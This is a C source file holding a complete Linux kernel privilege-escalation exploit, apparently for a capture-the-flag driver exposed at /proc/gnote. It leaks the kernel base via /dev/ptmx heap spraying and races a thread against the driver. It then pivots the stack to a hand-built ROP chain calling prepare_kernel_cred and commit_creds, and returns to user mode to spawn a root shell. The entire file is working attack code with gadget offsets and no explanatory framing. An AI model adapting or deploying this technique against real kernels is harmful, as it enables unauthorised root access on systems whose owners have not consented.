//gcc ccpkc.c -static -lpthread -masm=intel -o exploit
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <pthread.h>


int fd ;
unsigned int args[2] = {0, 0};
int win = 0;


int ptmx_fds[0x100];

size_t user_cs, user_ss, user_rflags, user_sp;
void save_status()
{
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;"
            );
    puts("[*]status has been saved.");
}


void spawn_shell()
{
    win = 1;
    if(!getuid())
    {
        int ret = getuid();
        printf("uid: %d\n", ret);
        puts("[*] win!");
        system("/bin/sh");

    }
    else
    {
        puts("[*]spawn shell error!");
    }
    exit(0);
}

void open_ptmx(void) {
    for (int i=0; i<0x100; i++)
        ptmx_fds[i] = open("/dev/ptmx", O_NOCTTY|O_RDWR);
}

void close_ptmx(void) {
    for (int i=0; i<0x100; i++)
        close(ptmx_fds[i]);
}


int g_write_add(unsigned int size) {
    unsigned int buf[2] = {1, size};
    return write(fd, buf, 0xbeef);
}

int g_write_select(unsigned int idx) {
    unsigned int buf[2] = {5, idx};
    return write(fd, buf, 0xdead);
}


int g_read(unsigned long* buf, unsigned int size) {
    return read(fd, buf, size);
}

void* thread() {

    while (1) {
        args[0] = 5;
        write(fd, args, 0xbad);
    }
}



int main(void) {
    save_status();
    fd = open("/proc/gnote", O_RDWR);
    if (fd < 0)
        exit(1);

    // leak kernel base address
    unsigned long tmp[0x400/8];
    memset(tmp, 0, sizeof(tmp));
    open_ptmx();
    close_ptmx();
    g_write_add(0x400);
    g_write_add(0x400);
    g_write_select(0);
    g_read(tmp, 0x400);
   /*
    for (int i=0; i<0x400/8; i++)
        printf("%lx ", tmp[i]);
    */
    unsigned long leak = tmp[0x2b0/8];
    printf("leak = %lx\n", leak);
    // ffffffff812ac7d0
    if (leak&0xfff != 0x7d0) {
        g_write_select(1);
        g_read(tmp, 0x400);
    }
    leak = tmp[0x2b0/8];

    unsigned long kernel_base = leak - 0x2ac7d0;
    printf("kernel_base = 0x%lx\n", kernel_base);

    unsigned long* fake_table = mmap((void*)0x6b5000000, 0x1000000, PROT_READ|PROT_WRITE|PROT_EXEC, 0x32 | MAP_POPULATE, -1, 0);
    // memset(fake_table, 'A', 0x1000000);
    // 0xffffffff81254075: mov esp, 0x5B000000 ; pop r12 ; pop rbp ; ret  ;  (1 found)
    unsigned long pivot_gadget = kernel_base + 0x254075;
    for (int i=0; i<0x1000000/8; i++)
        fake_table[i] = pivot_gadget;

    unsigned long* fake_stack = mmap((void*)0x5B000000-0x1000, 0x10000, PROT_READ|PROT_WRITE|PROT_EXEC, 0x32 | MAP_POPULATE, -1, 0);
    //unsigned long* fake_stack = mmap((void*)0x5B000000, 0x10000, PROT_READ|PROT_WRITE|PROT_EXEC, 0x32 | MAP_POPULATE, -1, 0);
    unsigned long modprobe_path = kernel_base + 0xc2c540;
    // 0xffffffff810eb471: mov qword [rax], rdi ; pop rbp ; ret  ;  (1 found)
    // 0xffffffff810209e1: pop rax ; ret  ;  (13 found)
    // 0xffffffff8101c20d: pop rdi ; ret  ;  (31 found)

    unsigned long pop_rdi = kernel_base + 0x1c20d;

    unsigned long cc = kernel_base + 0x69df0;
    unsigned long pkc = kernel_base + 0x69fe0;

    unsigned long sysretq = kernel_base + 0x600116;

    //0xffffffff812a9b38: pop r11 ; pop rbp ; ret  ;  (1 found)
    unsigned long pop_r11 = kernel_base + 0x2a9b38;
    unsigned long pop_rcx = kernel_base + 0x37523;

    // 0xffffffff81580714: mov rdi, rax ; mov qword [rdi], 0x0000000000000001 ; pop rbp ; ret  ;  (1 found)
    unsigned long mov_rdi_rax_pop1 = kernel_base + 0x580714;

    fake_stack += (0x1000/8);
    *fake_stack++ = 0xdeadbeef;
    *fake_stack++ = 0xdeadbeef;
    *fake_stack++ = pop_rdi; 
    *fake_stack++ = 0; 
    *fake_stack++ = pkc; 
    *fake_stack++ = mov_rdi_rax_pop1;
    *fake_stack++ = 0xc0bebeef; 
    *fake_stack++ = cc;
    *fake_stack++ = pop_rcx;
    *fake_stack++ = &spawn_shell;
    *fake_stack++ = pop_r11;
    *fake_stack++ = user_rflags;
    *fake_stack++ = 0xdeadbeef;
    *fake_stack++ = sysretq;
    *fake_stack++ = 0;
    *fake_stack++ = 0; 
    *fake_stack++ = user_sp;

    pthread_t t;
    pthread_create(&t, NULL, thread, (void*)NULL);

    //printf("%p, %p, %p, %p\n", user_cs, user_ss, user_rflags, user_sp);

    while (win == 0) {
        args[0]=0xdeadbeef;
    }
    pthread_join(t, NULL); 
    return 0;
}
